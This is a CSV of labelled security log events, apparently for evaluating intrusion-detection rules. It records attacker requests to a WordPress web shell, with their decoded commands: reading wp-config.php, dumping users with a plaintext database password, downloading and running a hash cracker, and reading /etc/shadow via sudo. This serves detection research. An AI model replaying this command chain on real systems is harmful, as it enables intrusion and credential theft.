event_id,datetime,display_name,decoded,ground_truth_label,label_predict,group_count,low_event_ids,status
20,2022-01-18T12:38:19.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYXRlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""date""]]",check_date,Time-Temporal Information Commands in HTTP Request,1,20,TP
21,2022-01-18T12:38:21.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""ls"", ""-laR"", ""/var/www""]]",list_web_dir,Filesystem Commands in HTTP Request,1,21,TP
22,2022-01-18T12:38:23.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQucHJpY2UuZm94Lm9yZy93cC1jb25maWcucGhwIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""cat"", ""/var/www/intranet.price.fox.org/wp-config.php""]]",check_wp_config,File Read Commands in HTTP Request,1,22,TP
23,2022-01-18T12:38:25.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""mysql"", ""-u"", ""wordpress"", ""-ptainoox3aedeeSh"", ""wordpress_db"", ""-e"", ""\""select * from wp_users\""""]]",dump_wp_users,Database Commands in HTTP Request,1,23,TP
24,2022-01-18T12:38:27.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wcm9maWxlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""cat"", ""/etc/profile""]]",read_profile,File Read Commands in HTTP Request,1,24,TP
25,2022-01-18T12:38:29.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""wget"", ""https://github.com/ait-aecid/wphashcrack/archive/refs/tags/v0.1.tar.gz""]]",decide_crack_method,File Resource Commands in HTTP Request,1,25,TP
26,2022-01-18T12:38:32.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,http_request: POST / HTTP/1.1 from: 10.35.35.118 code: 200 user_agent: python-requests/2.27.1,-,HTTP Request with Suspicious User Agent,1,26,FP
27,2022-01-18T12:39:03.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ0YXIiLCAieHZmeiIsICJ2MC4xLnRhci5neiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""tar"", ""xvfz"", ""v0.1.tar.gz""]]",-,File Resource Commands in HTTP Request,2,27|28,FP
29,2022-01-18T12:39:11.000000+00:00,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""./wphashcrack-0.1/wphashcrack.sh"", ""-w"", ""$PWD/rockyou.txt"", ""-j"", ""./wphashcrack-0.1/john-1.7.6-jumbo-12-Linux64/run"", ""-u"", ""phopkins""]]",crack_wphash,Shell Script Execution Commands in HTTP Request,1,29,TP
31,2022-01-18T13:14:41.000000+00:00,OS:evidences\\\\auth.log,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list,check_sudo,Sudo Command Executed in Web Directory,1,31,TP
32,2022-01-18T13:14:43.000000+00:00,OS:evidences\\\\auth.log,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/ls -laR /root/,list_root,Sudo List Command Executed from Web Directory,1,32,TP
33,2022-01-18T13:14:49.000000+00:00,OS:evidences\\\\auth.log,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow,read_shadow,Sudo Read Command Executed from Web Directory,1,33,TP
34,2022-01-18T13:14:50.000000+00:00,OS:/mnt/d/0experiment/1-1-plaso-sec/data-p-ait-v2-wilson/evidences/auth.log,[sudo] jwilkinson : TTY=pts/1 ; PWD=/var/www/intranet.hallbrown.wilson.com/wp-content/uploads/2022/02 ; USER=root ; COMMAND=/sbin/iptables -L,sudo_iptables,Sudo Network Command Executed from Web Directory,1,34,TP
